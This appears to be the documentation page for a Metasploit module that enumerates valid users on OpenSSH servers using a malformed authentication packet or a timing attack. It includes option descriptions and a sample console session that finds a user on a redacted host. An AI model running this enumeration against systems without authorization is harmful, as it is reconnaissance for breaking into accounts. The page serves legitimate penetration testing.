## Introduction

This module uses a malformed packet or timing attack to enumerate users on
an OpenSSH server.

Testing note: invalid users were logged, while valid users were not. YMMV.

## Actions

**Malformed Packet**

The default action sends a malformed (corrupted) `SSH_MSG_USERAUTH_REQUEST`
packet using public key authentication (must be enabled) to enumerate users.

**Timing Attack**

On some versions of OpenSSH under some configurations, OpenSSH will return a
"permission denied" error for an invalid user faster than for a valid user,
creating an opportunity for a timing attack to enumerate users.

## Options

**USERNAME**

Single username to test (username spray).

**USER_FILE**

File containing usernames, one per line.

**THRESHOLD**

Amount of seconds needed before a user is considered found (timing attack only).

**CHECK_FALSE**

Check for false positives (random username).

## Usage

```
msf5 > use auxiliary/scanner/ssh/ssh_enumusers
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set rhosts [redacted]
rhosts => [redacted]
msf5 auxiliary(scanner/ssh/ssh_enumusers) > echo $'wvu\nbcook' > users
[*] exec: echo $'wvu\nbcook' > users

msf5 auxiliary(scanner/ssh/ssh_enumusers) > set user_file users
user_file => users
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set verbose true
verbose => true
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] [redacted]:22 - SSH - Using malformed packet technique
[*] [redacted]:22 - SSH - Starting scan
[+] [redacted]:22 - SSH - User 'wvu' found
[-] [redacted]:22 - SSH - User 'bcook' not found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set action Timing Attack
action => Timing Attack
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] [redacted]:22 - SSH - Using timing attack technique
[*] [redacted]:22 - SSH - Starting scan
[+] [redacted]:22 - SSH - User 'wvu' found
[-] [redacted]:22 - SSH - User 'bcook' not found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_enumusers) > creds
Credentials
===========

host         origin       service       public  private  realm  private_type
----         ------       -------       ------  -------  -----  ------------
[redacted]   [redacted]   22/tcp (ssh)  wvu

msf5 auxiliary(scanner/ssh/ssh_enumusers) >
```
